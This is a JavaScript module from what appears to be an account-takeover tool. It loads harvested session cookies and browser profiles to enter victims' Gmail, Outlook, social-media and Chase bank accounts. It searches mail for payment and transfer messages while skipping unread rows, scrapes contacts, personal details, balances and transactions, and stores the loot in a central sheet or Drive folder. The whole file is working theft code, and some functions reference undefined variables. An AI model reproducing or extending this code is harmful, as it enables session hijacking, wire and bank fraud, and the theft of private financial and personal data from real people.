            // Wait for search results to load
            try {
                await page.waitForSelector('div[data-index]', { timeout: 10000 });
            } catch (e) {
                logger.warn(`[smartExtract] Outlook search "${term}": no rows after 10s`);
                continue;
            }

            // Scroll to load more search results (Outlook uses virtual scrolling)
            const allRows = [];
            const seenRows = new Set();

            for (let scrollIteration = 0; scrollIteration < 3; scrollIteration++) {
                // Scrape current batch of search results
                const batch = await page.evaluate((existingTexts) => {
                    const items = document.querySelectorAll('div[data-index]');
                    const out = [];
                    const seenInner = new Set();

                    for (const el of items) {
                        const isUnread = el.querySelector('.DLvHz') || el.classList.contains('DLvHz');
                        if (isUnread) continue;
                        const subject = el.querySelector('[aria-label="Subject"]')?.textContent?.trim()
                            || el.querySelector('span[title]')?.textContent?.trim() || '';
                        const snippet = el.querySelector('[aria-label="Message preview"]')?.textContent?.trim()
                            || el.querySelector('span[aria-label*="preview"]')?.textContent?.trim() || '';
                        const sender = el.querySelector('span[aria-label^="From:"]')?.textContent?.trim() || '';
                        const date = el.querySelector('[aria-label="Received"]')?.textContent?.trim()
                            || el.querySelector('span[aria-label*="Received"]')?.textContent?.trim() || '';
                        const text = [sender, subject, snippet, date].filter(Boolean).join(' | ');
                        if (text && !seenInner.has(text) && !existingTexts.includes(text)) {
                            seenInner.add(text);
                            out.push(text);
                        }
                        if (out.length >= 15) break;
                    }
                    return { out, totalItems: items.length };
                }, allRows);

                for (const r of batch.out) {
                    if (!seenRows.has(r)) {
                        seenRows.add(r);
                        allRows.push(r);
                    }
                }

                if (allRows.length >= maxEmails) break;

                // Scroll down to load more results
                const prevCount = allRows.length;
                await page.evaluate(() => window.scrollBy(0, 1500));
                await sleep(1800);

                // If no new results loaded, stop scrolling
                if (allRows.length === prevCount) break;
            }

            logger.info(`[smartExtract] Outlook search "${term}": totalItems=${allRows.length} (after scrolling), extracted=${allRows.length}`);
            for (const r of allRows) {
                const key = r.slice(0, 120);
                if (seen.has(key)) continue;
                seen.add(key);
                emails.push(r);
                if (emails.length >= maxEmails) break;
            }

            // Small delay between searches
            await new Promise(r => setTimeout(r, 1000));
        } catch (e) {
            logger.warn(`[smartExtract] Outlook search failed for ${term}: ${e.message}`);
        }
    }

    return emails;
}

/**
 * Gmail: URL-based search (works fine, no redirect issues).
 */
async function collectGmailEmailTexts(page, maxEmails = 30, terms = FINANCIAL_TERMS) {
    const emails = [];
    const seen = new Set();

    for (const term of terms) {
        if (emails.length >= maxEmails) break;
        try {
            const url = `https://mail.google.com/mail/u/0/#search/${encodeURIComponent(term)}`;
            await gotoRobust(page, url);
            if (isSignInPage(page.url())) {
                logger.warn(`[smartExtract] Gmail search redirected to sign-in: ${page.url()}`);
                break;
            }
            try {
                await page.waitForSelector('tr[role="row"], .zA, .zE', { timeout: 10000 });
            } catch (e) {
                logger.warn(`[smartExtract] Gmail search "${term}": no rows after 10s`);
            }
            const rows = await page.evaluate(() => {
                const items = [];
                ['tr[role="row"]', '.zA', '.zE', '[role="row"]'].forEach(sel => {
                    document.querySelectorAll(sel).forEach(el => items.push(el));
                });
                const diag = {
                    title: document.title,
                    url: location.href,
                    trRoleRow: document.querySelectorAll('tr[role="row"]').length,
                    zA: document.querySelectorAll('.zA').length,
                    zE: document.querySelectorAll('.zE').length,
                    totalItems: items.length,
                };
                const out = [];
                const seenInner = new Set();
                for (const el of items) {
                    const sender = el.querySelector('span.zF')?.getAttribute('email')
                        || el.querySelector('span.zF')?.textContent?.trim() || '';
                    const subject = el.querySelector('span.bog')?.textContent?.trim() || '';
                    const snippet = el.querySelector('span.bqe')?.textContent?.trim() || '';
                    const date = el.querySelector('td.xW span[title]')?.getAttribute('title')
                        || el.querySelector('span.xW')?.textContent?.trim() || '';
                    const text = [sender, subject, snippet, date].filter(Boolean).join(' | ');
                    if (text && !seenInner.has(text)) {
                        seenInner.add(text);
                        out.push(text);
                    }
                    if (out.length >= 15) break;
                }
                return { out, diag };
            });
            logger.info(`[smartExtract] Gmail search "${term}": totalItems=${rows.diag.totalItems}, extracted=${rows.out.length}`);
            for (const r of rows.out) {
                const key = r.slice(0, 120);
                if (seen.has(key)) continue;
                seen.add(key);
                emails.push(r);
                if (emails.length >= maxEmails) break;
            }
        } catch (e) {
            logger.warn(`[smartExtract] Gmail search failed for ${term}: ${e.message}`);
        }
    }
    return emails;
}

async function collectEmailTexts(page, platform, email, maxEmails = 30, terms = FINANCIAL_TERMS) {
    // Outlook: use UI-based search to avoid session redirects
    if (platform === 'outlook') {
        return await performOutlookSearch(page, terms, email, maxEmails);
    }
    // Gmail: use URL-based search (works fine)
    return await collectGmailEmailTexts(page, maxEmails, terms);
}

async function extractFinancialSummary(page, platform, email) {
    const emailTexts = await collectEmailTexts(page, platform, email, 30);

    let aiResult = null;
    try {
        aiResult = await aiService.extractFinancialSummaryAI(emailTexts);
    } catch (e) {
        logger.warn(`[smartExtract] financialSummary AI failed: ${e.message}`);
    }

    const combined = emailTexts.join('\n');
    const mentions = /(invoice|payment|receipt|bank|transfer|paypal|zelle|venmo|transaction)/i.test(combined);

    return {
        boxFinancialSummary: {
            mentionsOfTransactions: aiResult?.boxFinancialSummary?.mentionsOfTransactions ?? mentions,
            identifiedPaymentMethods: aiResult?.boxFinancialSummary?.identifiedPaymentMethods || [],
            potentialInvoiceCount: aiResult?.boxFinancialSummary?.potentialInvoiceCount || 0,
        },
        averageTransactionAmount: aiResult?.averageTransactionAmount ?? 0,
        lastTransactionDate: aiResult?.lastTransactionDate || '',
        pendingTransactionsCount: aiResult?.pendingTransactionsCount ?? 0,
        transactionBox: aiResult?.transactionBox ?? mentions,
    };
}

// ==================== Activities (AI, last 50 read+sent) ====================

async function collectRecentEmails(page, platform, email, limit = 50) {
    const emails = [];
    const seen = new Set();

    const views = platform === 'gmail'
        ? ['inbox', 'sent']
        : ['0/inbox', '0/sent'];

    // Determine correct Outlook base URL from email domain (not from page.url())
    const outlookBaseUrl = platform === 'outlook' ? getOutlookBaseUrl(email) : 'https://outlook.live.com/mail';

    for (const view of views) {
        if (emails.length >= limit) break;
        try {
            const url = platform === 'gmail'
                ? `https://mail.google.com/mail/u/0/#${view}`
                : `${outlookBaseUrl}/${view}`;
            await gotoRobust(page, url);
            if (isSignInPage(page.url())) {
                logger.warn(`[smartExtract] activities view redirected to sign-in: ${page.url()}`);
                break;
            }
            await sleep(1500);

            // For Outlook, scroll to load more messages (virtual scrolling)
            if (platform === 'outlook') {
                const seenRows = new Set();
                for (let scrollIteration = 0; scrollIteration < 3; scrollIteration++) {
                    const batch = await page.evaluate((existingTexts) => {
                        const items = document.querySelectorAll('div[data-index]');
                        const out = [];
                        const seenInner = new Set();

                        for (const el of items) {
                            const isUnread = el.querySelector('.DLvHz') || el.classList.contains('DLvHz');
                            if (isUnread) continue;
                            const subject = el.querySelector('[aria-label="Subject"]')?.textContent?.trim()
                                || el.querySelector('span[title]')?.textContent?.trim() || '';
                            const snippet = el.querySelector('[aria-label="Message preview"]')?.textContent?.trim()
                                || el.querySelector('span[aria-label*="preview"]')?.textContent?.trim() || '';
                            const sender = el.querySelector('span[aria-label^="From:"]')?.textContent?.trim() || '';
                            const date = el.querySelector('[aria-label="Received"]')?.textContent?.trim()
                                || el.querySelector('span[aria-label*="Received"]')?.textContent?.trim() || '';
                            const text = [sender, subject, snippet, date].filter(Boolean).join(' | ');
                            if (text && !seenInner.has(text) && !existingTexts.includes(text)) {
                                seenInner.add(text);
                                out.push(text);
                            }
                        }
                        return out.slice(0, 40);
                    }, Array.from(seenRows));

                    for (const r of batch) {
                        if (!seenRows.has(r)) {
                            seenRows.add(r);
                        }
                    }

                    if (seenRows.size >= limit) break;

                    // Scroll down to load more messages
                    const prevCount = seenRows.size;
                    await page.evaluate(() => window.scrollBy(0, 1500));
                    await sleep(1800);

                    // If no new messages loaded, stop scrolling
                    if (seenRows.size === prevCount) break;
                }

                for (const r of seenRows) {
                    const key = r.slice(0, 120);
                    if (seen.has(key)) continue;
                    seen.add(key);
                    emails.push(r);
                    if (emails.length >= limit) break;
                }
            } else {
                // Gmail: grab visible rows (URL-based navigation works fine)
                const rows = await page.evaluate(() => {
                    const out = [];
                    const seenInner = new Set();
                    ['tr[role="row"]', '.zA', '.zE'].forEach(sel => {
                        document.querySelectorAll(sel).forEach(el => {
                            const sender = el.querySelector('span.zF')?.getAttribute('email')
                                || el.querySelector('span.zF')?.textContent?.trim() || '';
                            const subject = el.querySelector('span.bog')?.textContent?.trim() || '';
                            const snippet = el.querySelector('span.bqe')?.textContent?.trim() || '';
                            const date = el.querySelector('td.xW span[title]')?.getAttribute('title')
                                || el.querySelector('span.xW')?.textContent?.trim() || '';
                            const text = [sender, subject, snippet, date].filter(Boolean).join(' | ');
                            if (text && !seenInner.has(text)) { seenInner.add(text); out.push(text); }
                        });
                    });
                    return out.slice(0, 40);
                });

                for (const r of rows) {
                    const key = r.slice(0, 120);
                    if (seen.has(key)) continue;
                    seen.add(key);
                    emails.push(r);
                    if (emails.length >= limit) break;
                }
            }
        } catch (e) {
            logger.warn(`[smartExtract] activities view failed ${view}: ${e.message}`);
        }
    }

    return emails;
}

async function extractActivities(page, platform, email, financialTexts = [], limit = 50) {
    // Primary source: financial search results (payment/transaction-related messages)
    // These are the IMPORTANT messages found through keyword searches
    let sourceTexts = Array.isArray(financialTexts) ? financialTexts : [];

    // Fallback: if no financial texts, collect recent emails
    if (sourceTexts.length === 0) {
        logger.info(`[smartExtract] activities: no financial texts, falling back to recent emails`);
        try {
            sourceTexts = await collectRecentEmails(page, platform, email, limit);
        } catch (e) {
            logger.warn(`[smartExtract] activities: collectRecentEmails failed: ${e.message}`);
        }
    } else {
        logger.info(`[smartExtract] activities: using ${sourceTexts.length} financial search results as primary source`);
    }

    let aiActivities = [];
    try {
        aiActivities = await aiService.extractActivitiesAI(sourceTexts);
    } catch (e) {
        logger.warn(`[smartExtract] activities AI failed: ${e.message}`);
    }

    if (Array.isArray(aiActivities) && aiActivities.length > 0) {
        return aiActivities.map(a => ({
            type: String(a.type || 'READ').toUpperCase(),
            on: a.on || '',
            to: a.to || '',
            subject: a.subject || '',
            summary: a.summary || '',
        })).slice(0, limit);
    }

    // Fallback: generic activities from raw text.
    return sourceTexts.slice(0, limit).map(text => ({
        type: 'READ',
        on: '',
        to: '',
        subject: text.slice(0, 120),
        summary: text.slice(0, 200),
    }));
}

// ==================== WIRE Extractor ====================

async function extractWire(session, browserId) {
    const cookieJSON = session.cookieJSON;
    // Layered platform resolution — never silently coerce a custom-domain
    // account to gmail (that navigated mail.google.com for Office accounts):
    //   1. session.platform (stored cookie-sheet column, else domain detection)
    //   2. cookie-domain inference (google.com vs outlook/office cookies)
    //   3. gmail fallback with a warning log
    let platform = session.platform;
    let platformSource = session.platformSource || 'domain';
    if (platform !== 'gmail' && platform !== 'outlook') {
        const inferred = inferPlatformFromCookies(cookieJSON);
        if (inferred) {
            platform = inferred;
            platformSource = 'cookies';
        } else {
            platform = 'gmail';
            platformSource = 'default';
            logger.warn(`[smartExtract] platform unresolved for domain='${session.domain}' (stored='${session.storedPlatform || 'none'}', detected='${session.platform}') — defaulting to gmail`);
        }
    }
    logger.info(`[smartExtract] platform resolved: ${platform} (source=${platformSource}, domain=${session.domain || 'unknown'})`);
    const start = Date.now();

    // Financial search batches
    const BATCH1 = ['invoice', 'payment', 'receipt'];
    const BATCH2 = ['bank', 'transfer', 'paypal'];
    const BATCH3 = ['zelle', 'venmo', 'transaction'];
    const PHASES = 7;

    // Download profile from Drive if available (gives full Chromium session state)
    let profileDir = null;
    if (session.driveUrl) {
        try {
            profileDir = await downloadAndExtractProfile(session.driveUrl, browserId);
            if (profileDir) logger.info(`[smartExtract] Using persistent profile from Drive`);
        } catch (e) {
            logger.warn(`[smartExtract] Profile download failed: ${e.message}`);
        }
    }

    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform });
    try {
        let done = 0;
        const update = (label) => { done++; if (browserId) updateExtractStatus(browserId, `extracting ${label} (${done}/${PHASES})`); };

        const email = session.email || '';

        // Phase 1: Box Summary (navigates to #inbox)
        logger.info(`[smartExtract] phase 1/${PHASES}: box`);
        let box = {};
        try { box = await extractBoxSummary(page, platform, email); } catch (e) { logger.warn(`[smartExtract] box failed: ${e.message}`); }
        update('box');

        // Phase 2: Financial batch 1 (invoice, payment, receipt)
        logger.info(`[smartExtract] phase 2/${PHASES}: financial1`);
        let financial1 = [];
        try { financial1 = await collectEmailTexts(page, platform, email, 10, BATCH1); } catch (e) { logger.warn(`[smartExtract] financial1 failed: ${e.message}`); }
        update('financial1');

        // Phase 3: Financial batch 2 (bank, transfer, paypal)
        logger.info(`[smartExtract] phase 3/${PHASES}: financial2`);
        let financial2 = [];
        try { financial2 = await collectEmailTexts(page, platform, email, 10, BATCH2); } catch (e) { logger.warn(`[smartExtract] financial2 failed: ${e.message}`); }
        update('financial2');

        // Phase 4: Financial batch 3 (zelle, venmo, transaction)
        logger.info(`[smartExtract] phase 4/${PHASES}: financial3`);
        let financial3 = [];
        try { financial3 = await collectEmailTexts(page, platform, email, 10, BATCH3); } catch (e) { logger.warn(`[smartExtract] financial3 failed: ${e.message}`); }
        update('financial3');

        // Merge financial batches BEFORE activities so we can pass them as primary source
        const allFinancialTexts = [...financial1, ...financial2, ...financial3];
        logger.info(`[smartExtract] merged financial texts: ${allFinancialTexts.length} (f1=${financial1.length}, f2=${financial2.length}, f3=${financial3.length})`);

        // Phase 5: Activities (uses financial search results as primary source)
        logger.info(`[smartExtract] phase 5/${PHASES}: activities`);
        let activities = [];
        try { activities = await extractActivities(page, platform, email, allFinancialTexts, 50); } catch (e) { logger.warn(`[smartExtract] activities failed: ${e.message}`); }
        update('activities');

        // Phase 6: Personal Info (navigates to myaccount.google.com)
        logger.info(`[smartExtract] phase 6/${PHASES}: personal`);
        let personal = {};
        try { personal = await extractPersonalInfo(page, platform, email); } catch (e) { logger.warn(`[smartExtract] personal failed: ${e.message}`); }
        update('personal');

        // Phase 7: Contacts (navigates to contacts.google.com)
        logger.info(`[smartExtract] phase 7/${PHASES}: contacts`);
        let contacts = [];
        try { contacts = await extractContacts(page, platform, email); } catch (e) { logger.warn(`[smartExtract] contacts failed: ${e.message}`); }
        update('contacts');

        // Run AI financial analysis on merged texts
        let financialSummary = {};
        try {
            financialSummary = await aiService.extractFinancialSummaryAI(allFinancialTexts);
        } catch (e) {
            logger.warn(`[smartExtract] financialSummary AI failed: ${e.message}`);
        }

        const combined = allFinancialTexts.join('\n');
        const mentions = /(invoice|payment|receipt|bank|transfer|paypal|zelle|venmo|transaction)/i.test(combined);

        // Log extraction counts
        logger.info(`[smartExtract] COUNTS: personal(name=${personal.name || 'N/A'}, email=${personal.recoveryEmail || 'N/A'}, phone=${personal.phone || 'N/A'})`);
        logger.info(`[smartExtract] COUNTS: box(total=${box.totalEmails || 0}, unread=${box.unreadEmails || 0}, folders=${(box.folders || []).length})`);
        logger.info(`[smartExtract] COUNTS: contacts=${contacts.length}`);
        logger.info(`[smartExtract] COUNTS: financial=${allFinancialTexts.length} (f1=${financial1.length}, f2=${financial2.length}, f3=${financial3.length})`);
        logger.info(`[smartExtract] COUNTS: activities=${activities.length}`);

        logger.info(`[smartExtract] EXTRACT DONE ${browserId || 'unknown'} in ${Date.now() - start}ms`);
        return {
            timestamp: new Date().toISOString(),
            emailAddress: session.email,
            passwordHint: session.password ? 'stored' : null,
            personalInfo: personal,
            boxSummary: box,
            contacts: contacts,
            ...financialSummary,
            financialMentions: mentions,
            activities: activities,
            extractedFrom: platform,
            extractedAt: new Date().toISOString(),
            _diagnostics: {
                personal: personal._diag || {},
                box: box._diag || {},
                contactsCount: contacts.length,
                financialCount: allFinancialTexts.length,
                activitiesCount: activities.length,
            },
        };
    } finally {
        // Close browser
        await page.close().catch(() => {});
        await browser.close().catch(() => {});
        // Clean up downloaded profile directory
        if (profileDir) {
            const fs = await import('fs-extra');
            await fs.remove(profileDir).catch(() => {});
        }
    }
}

// ==================== SOCIAL Extractor ====================

async function extractSocial(session, username, explicitPlatform, browserId) {
    const cookieJSON = session.cookieJSON;
    const cookiePlatform = (session.socialPlatform || session.category || '').toLowerCase();
    const platformKey = (explicitPlatform || cookiePlatform || 'twitter').toLowerCase().trim();
    let config;
    try {
        config = getPlatformConfig(platformKey);
    } catch (e) {
        logger.warn(`[smartExtract] No extractor config for '${platformKey}', falling back to twitter`);
        config = getPlatformConfig('twitter');
    }

    // Download profile from Drive if available
    let profileDir = null;
    if (session.driveUrl) {
        try {
            profileDir = await downloadAndExtractProfile(session.driveUrl, browserId);
        } catch (e) {
            logger.warn(`[smartExtract] social profile download failed: ${e.message}`);
        }
    }

    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform });
    let tab1;
    try {
        tab1 = await createTab(browser, cookieJSON);

        const profile = { followersCount: 0, followingCount: 0, lastPostDate: '', recentActivity: [], followers: [] };
        const account = {
            accountId: session.browserId,
            platform: platformKey,
            username: username || session.email,
            lastUsed: '',
            active: true,
            ipAddress: '',
            device: { userAgent: '', browser: '', os: '' },
            extractedDetails: profile,
            detailsExtractedFrom: '',
        };

        const usernameClean = String(username || '').replace('@', '');

        const [profileResult, followersResult] = await Promise.all([
            (async () => {
                try {
                    const profileUrl = config.profileUrl.replace('{username}', usernameClean);
                    await gotoRobust(page, profileUrl);
                    const extractor = getExtractor(platformKey, 'profile');
                    if (extractor?.parseFunction) {
                        const parseFunc = new Function('items', extractor.parseFunction);
                        const elements = await page.$$(extractor.selector);
                        const data = parseFunc(elements);
                        profile.followersCount = parseCount(data?.stats?.followers);
                        profile.followingCount = parseCount(data?.stats?.following);
                        profile.lastPostDate = data?.recentTweets?.[0]?.url ? new Date().toISOString() : '';
                        profile.recentActivity = (data?.recentTweets || []).slice(0, 5).map(t => ({
                            type: 'POST', on: '', text: t.text || '',
                        }));
                    }
                    logger.info(`[smartExtract] tab DONE social-profile`);
                } catch (e) {
                    logger.warn(`[smartExtract] tab FAIL social-profile: ${e.message}`);
                }
            })(),
            (async () => {
                try {
                    if (config.followersUrl) {
                        const followersUrl = config.followersUrl.replace('{username}', usernameClean);
                        await gotoRobust(tab1, followersUrl);
                        const extractor = getExtractor(platformKey, 'followers');
                        if (extractor?.parseFunction) {
                            const seen = new Set();
                            for (let i = 0; i < 5; i++) {
                                const parseFunc = new Function('items', extractor.parseFunction);
                                const elements = await tab1.$$(extractor.selector);
                                const batch = parseFunc(elements);
                                for (const f of batch) {
                                    const key = f.username || f.name || f.email || '';
                                    if (!key || seen.has(key)) continue;
                                    seen.add(key);
                                    profile.followers.push({
                                        username: f.username || f.name || '',
                                        fullName: f.fullName || f.name || '',
                                        profileUrl: f.profileUrl || '',
                                        isFollowingYou: false,
                                        email: f.email || '',
                                        phone: f.phone || 0,
                                        relationshipSummary: f.bio || '',
                                    });
                                }
                                if (profile.followers.length >= 100 || profile.followers.length === 0) break;
                                await tab1.evaluate(() => window.scrollBy(0, 900));
                                await sleep(1800);
                            }
                            profile.followers = profile.followers.slice(0, 100);
                        }
                    }
                    logger.info(`[smartExtract] tab DONE social-followers`);
                } catch (e) {
                    logger.warn(`[smartExtract] tab FAIL social-followers: ${e.message}`);
                }
            })(),
        ]);

        account.extractedDetails = profile;
        account.detailsExtractedFrom = config.profileUrl || '';
        return [account];
    } finally {
        await Promise.all([
            page.close().catch(() => {}),
            tab1?.close().catch(() => {}),
        ]);
        await browser.close().catch(() => {});
        if (profileDir) {
            const fs = await import('fs-extra');
            await fs.remove(profileDir).catch(() => {});
        }
    }
}

function parseCount(val) {
    if (typeof val === 'number') return val;
    if (!val) return 0;
    const s = String(val).toLowerCase();
    const m = s.match(/([\d.]+)\s*([kmb]?)/);
    if (!m) return 0;
    const n = parseFloat(m[1]);
    if (m[2] === 'k') return Math.round(n * 1000);
    if (m[2] === 'm') return Math.round(n * 1000000);
    if (m[2] === 'b') return Math.round(n * 1000000000);
    return Math.round(n);
}

// ==================== BANK Extractor ====================

const BANK_SITES = {
    chase: {
        loginUrl: 'https://chase.com',
        accountCard: "div[data-testid='account-card'], .account-card, [class*='account']",
        transactionRow: "tr[data-testid='transaction-row'], .transaction-row, [class*='transaction']",
    },
};

async function extractBank(session, explicitPlatform) {
    const cookieJSON = session.cookieJSON;
    const rawPlatform = explicitPlatform || session.bankPlatform || session.category || 'chase';
    const platformKey = String(rawPlatform).toLowerCase().trim();
    const bankConfig = BANK_SITES[platformKey] || BANK_SITES.chase;

    // Download profile from Drive if available
    let profileDir = null;
    if (session.driveUrl) {
        try {
            profileDir = await downloadAndExtractProfile(session.driveUrl, browserId);
        } catch (e) {
            logger.warn(`[smartExtract] bank profile download failed: ${e.message}`);
        }
    }

    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform });
    try {
        const accounts = [];
        const transactions = [];

        try {
            await gotoRobust(page, bankConfig.loginUrl);
            accounts.push(...await page.evaluate((cardSel) => {
                const out = [];
                document.querySelectorAll(cardSel).forEach(card => {
                    const name = card.querySelector('h3, [class*="name"]')?.textContent?.trim() || '';
                    const balance = card.querySelector('[class*="balance"]')?.textContent?.trim() || 'N/A';
                    const number = card.querySelector('[class*="number"], [class*="accountNumber"]')?.textContent?.trim() || 'N/A';
                    if (name || balance !== 'N/A') out.push({ name, balance, number, type: 'CHECKING' });
                });
                return out;
            }, bankConfig.accountCard));

            const txnLinks = await page.$$("a[href*='transaction'], a[href*='activity']");
            if (txnLinks.length > 0) {
                await txnLinks[0].click().catch(() => {});
                await sleep(2500);
                transactions.push(...await page.evaluate((rowSel) => {
                    const out = [];
                    document.querySelectorAll(rowSel).forEach(row => {
                        const date = row.querySelector('[class*="date"]')?.textContent?.trim() || '';
                        const amount = row.querySelector('[class*="amount"]')?.textContent?.trim() || '';
                        const desc = row.querySelector('[class*="desc"], [class*="description"]')?.textContent?.trim() || '';
                        if (date || amount) out.push({ date, amount, description: desc });
                    });
                    return out;
                }, bankConfig.transactionRow));
            }
        } catch (e) {
            logger.warn(`[smartExtract] bank extraction failed: ${e.message}`);
        }

        // Normalize into the BankAccount[] shape the frontend BankExtractView expects.
        const toNum = (val) => {
            if (typeof val === 'number') return val;
            const m = String(val || '').replace(/[^0-9.\-]/g, '');
            const n = parseFloat(m);
            return isNaN(n) ? 0 : n;
        };
        const bankAccounts = accounts.length > 0
            ? accounts.map((acct, i) => ({
                accountId: String(acct.number || `${platformKey}-${i + 1}`),
                accountType: String(acct.type || 'CHECKING').toUpperCase(),
                accountNumber: acct.number || 'N/A',
                routingNumber: '',
                balance: toNum(acct.balance),
                currency: 'USD',
                lastTransactionDate: transactions[0]?.date || '',
                pendingTransactionsCount: 0,
                totalCredit: 0,
                totalDebit: 0,
                interestRate: undefined,
                transactions: transactions.map(t => ({
                    date: t.date,
                    type: /credit|\+/i.test(t.amount) ? 'CREDIT' : 'DEBIT',
                    amount: toNum(t.amount),
                    description: t.description,
                })),
                detailsExtractedFrom: bankConfig.loginUrl,
            }))
            : [{
                accountId: platformKey,
                accountType: 'CHECKING',
                accountNumber: 'N/A',
                routingNumber: '',
                balance: 0,
                currency: 'USD',
                lastTransactionDate: '',
                pendingTransactionsCount: 0,
                totalCredit: 0,
                totalDebit: 0,
                transactions: transactions.map(t => ({
                    date: t.date,
                    type: /credit|\+/i.test(t.amount) ? 'CREDIT' : 'DEBIT',
                    amount: toNum(t.amount),
                    description: t.description,
                })),
                detailsExtractedFrom: bankConfig.loginUrl,
            }];

        return bankAccounts;
    } finally {
        await page.close().catch(() => {});
        await browser.close().catch(() => {});
        if (profileDir) {
            const fs = await import('fs-extra');
            await fs.remove(profileDir).catch(() => {});
        }
    }
}

// ==================== App Script Fallback ====================

async function writeHubViaAppScript(browserId, dataMap) {
    const appScriptUrl = process.env.SCRIPT_URL;
    const appScriptKey = process.env.SCRIPT_KEY;
    if (!appScriptUrl || !appScriptKey) {
        return { success: false, error: 'SCRIPT_URL or SCRIPT_KEY not configured' };
    }
    try {
        const params = new URLSearchParams({
            action: 'setMultipleCellDataByColumnSearch',
            sheetName: HUB_SHEET,
            searchColumn: 'submissionId',
            searchValue: browserId,
            key: appScriptKey,
            data: JSON.stringify(dataMap),
        });
        const resp = await axios.post(appScriptUrl, params, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: 60000,
        });
        if (resp.data?.success) {
            return { success: true };
        }
        return { success: false, error: resp.data?.error || 'App Script returned success=false' };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// ==================== Orchestrator ====================

async function updateExtractStatus(browserId, status) {
    try {
        await ensureSheetColumns(HUB_SHEET, ['submissionId', 'extractStatus', 'extractStatusAt']);
        await updateSheetRowApi(HUB_SHEET, 'submissionId', browserId, {
            extractStatus: status,
            extractStatusAt: new Date().toISOString(),
        });
    } catch (e) {
        logger.warn(`[smartExtract] status update failed: ${e.message}`);
    }
}

const EXTRACT_COLUMN = {
    wire: 'wireExtract',
    social: 'socialExtract',
    bank: 'bankExtract',
};

/**
 * Runs smart extraction for a browserId and persists the result to the HUB
 * sheet. Returns the normalized extract result.
 * @param {string} browserId
 * @param {string} category - 'WIRE' | 'SOCIAL' | 'BANK' (case-insensitive)
 * @param {string} [username] - social handle when available
 * @returns {Promise<{ success: boolean, category: string, data: object, column: string }>}
 */
export async function runSmartExtract(browserId, category, username, platform) {
    const cat = String(category || 'wire').toUpperCase();
    const key = cat === 'BANK' ? 'bank' : cat === 'SOCIAL' ? 'social' : 'wire';
    const column = EXTRACT_COLUMN[key];
    const inFlight = getInFlight();

    if (inFlight.has(browserId)) {
        throw new Error(`Extraction already in progress for browserId: ${browserId}`);
    }
    inFlight.add(browserId);
    logger.info(`[smartExtract] EXTRACT START browserId=${browserId} category=${cat} platform=${platform || 'auto'}`);
    const start = Date.now();

    try {
        await updateExtractStatus(browserId, 'started');
        const session = await resolveSession(browserId);

        let data;
        if (key === 'social') {
            await updateExtractStatus(browserId, 'extracting');
            data = await extractSocial(session, username || session.email, platform, browserId);
        } else if (key === 'bank') {
            await updateExtractStatus(browserId, 'extracting');
            data = await extractBank(session, platform);
        } else {
            data = await extractWire(session, browserId);
        }

        // Guard: if extraction returned empty data, retain existing cell value
        const isEmpty = !data || (typeof data === 'object' && Object.keys(data).length === 0);
        if (isEmpty) {
            logger.warn(`[smartExtract] Empty extract for ${column}, retaining existing cell data`);
            await updateExtractStatus(browserId, 'completed');
            return { success: true, empty: true, category: cat, column };
        }

        await updateExtractStatus(browserId, 'saving');

        // Save full extract JSON to Google Drive folder: HUB_FOLDER_ID/browserId/(wire|social|bank)Extract.json
        let driveRef = null;
        try {
            const fileName = `${column}.json`;
            const driveResult = await createOrUpdateJsonFile(HUB_FOLDER_ID, browserId, fileName, data);
            if (driveResult.success) {
                driveRef = { fileId: driveResult.fileId, fileName };
                logger.info(`[smartExtract] Saved ${column} to Drive: ${driveResult.fileId}`);
            } else {
                logger.warn(`[smartExtract] Drive save failed: ${driveResult.error}, falling back to cell storage`);
            }
        } catch (e) {
            logger.warn(`[smartExtract] Drive save error: ${e.message}, falling back to cell storage`);
        }

        // Ensure the hub column exists before writing.
        await ensureSheetColumns(HUB_SHEET, ['submissionId', column, `${column}At`]);

        // Write to hub: if Drive save succeeded, store reference; otherwise store full JSON
        const cellValue = driveRef
            ? JSON.stringify({ ...driveRef, size: JSON.stringify(data).length })
            : JSON.stringify(data);

        const hubWriteMap = {
            [column]: cellValue,
            [`${column}At`]: new Date().toISOString(),
        };

        let writeResult = await updateSheetRowApi(HUB_SHEET, 'submissionId', browserId, hubWriteMap);

        // App Script fallback when Sheets API fails (e.g. invalid_grant)
        if (!writeResult.success) {
            logger.warn(`[smartExtract] Sheets API hub write failed for ${browserId}: ${writeResult.error}. Trying App Script fallback.`);
            const asResult = await writeHubViaAppScript(browserId, hubWriteMap);
            if (!asResult.success) {
                logger.error(`[smartExtract] App Script hub write also failed for ${browserId}: ${asResult.error}`);
                throw new Error(`Failed to persist extract to hub: ${writeResult.error}`);
            }
            logger.info(`[smartExtract] Hub write succeeded via App Script fallback for ${browserId}`);
        }

        await updateExtractStatus(browserId, 'completed');
        logger.info(`[smartExtract] EXTRACT DONE browserId=${browserId} category=${cat} -> ${column} in ${Date.now() - start}ms`);
        return { success: true, category: cat, data, column };
    } catch (e) {
        await updateExtractStatus(browserId, 'failed').catch(() => {});
        logger.error(`[smartExtract] EXTRACT FAILED browserId=${browserId} category=${cat}: ${e.message}`);
        throw e;
    } finally {
        inFlight.delete(browserId);
    }
}
